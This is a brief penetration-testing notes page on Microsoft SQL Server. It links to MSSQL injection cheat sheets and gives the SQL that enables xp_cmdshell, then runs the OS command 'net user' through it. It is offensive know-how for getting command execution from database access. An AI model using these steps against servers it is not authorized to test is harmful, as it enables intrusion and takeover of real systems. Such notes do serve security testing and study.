---
tags: [mssql,windows]
---
# MS SQL Server

- [Pen test and hack microsoft sql server (mssql)](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)
- [MSSQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- [MSSQL Practical Injection Cheat Sheet](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)

## Enable xp_cmdshell on MS SQL Server 2005+

```sql
-- To allow advanced options to be changed.
EXEC sp_configure 'show advanced options', 1;
GO
-- To update the currently configured value for advanced options.
RECONFIGURE;
GO
-- To enable the feature.
EXEC sp_configure 'xp_cmdshell', 1;
GO
-- To update the currently configured value for this feature.
RECONFIGURE;
GO
```

https://docs.microsoft.com/fr-fr/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-2017

Then execute code:

```sql
EXEC master..xp_cmdshell 'net user';
```

PS: It is enabled by default for MS SQL Server 2000
